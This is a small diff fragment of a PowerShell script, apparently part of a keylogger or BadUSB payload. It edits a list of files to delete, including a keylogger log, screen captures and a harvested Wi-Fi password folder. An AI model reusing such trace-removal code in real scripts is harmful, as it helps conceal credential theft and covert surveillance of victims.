@@ -75,8 +75,7 @@ finally {
     $paths = @(
         "$env:APPDATA\c.ps1", 
         "$env:APPDATA\sg.ps1", 
-        "$env:APPDATA\sg2.ps1", 
-        "C:\Users\Irene\Desktop\OMG\testing\temp.txt", 
+        "$env:APPDATA\sg2.ps1",
         "$env:temp\keylogger.txt", 
         "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png",
         "C:\wipass\*"
